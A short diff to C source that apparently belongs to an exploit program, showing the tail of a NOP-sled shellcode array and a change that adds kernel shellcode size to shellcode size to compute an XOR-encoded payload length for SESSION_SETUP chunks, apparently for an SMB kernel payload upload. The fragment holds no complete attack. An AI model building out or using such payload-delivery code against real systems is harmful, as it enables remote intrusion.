@@ -246,8 +246,11 @@ int main(int argc, char* argv[])
 	"\x90\x90\x90\x90\x90\x90\x90\x90"
 	"\x90\x90\x90\x90\x90\x90\x90\x90";
 	
+	//might need to make this static due to sizeof being garbage @ counting shellcode
+	unsigned int EntireShellcodeSize = sizeof(kernel_shellcode)+sizeof(shellcode);
+	
 	//generate the SESSION_SETUP parameters here
-	unsigned int TotalSizeOfPayload = sizeof(shellcode) ^ XorKey;
+	unsigned int TotalSizeOfPayload = EntireShellcodeSize ^ XorKey;
 	unsigned int ChunkSize = 4096 ^ XorKey;
 	unsigned int OffsetofChunkinPayload = XorKey;
 
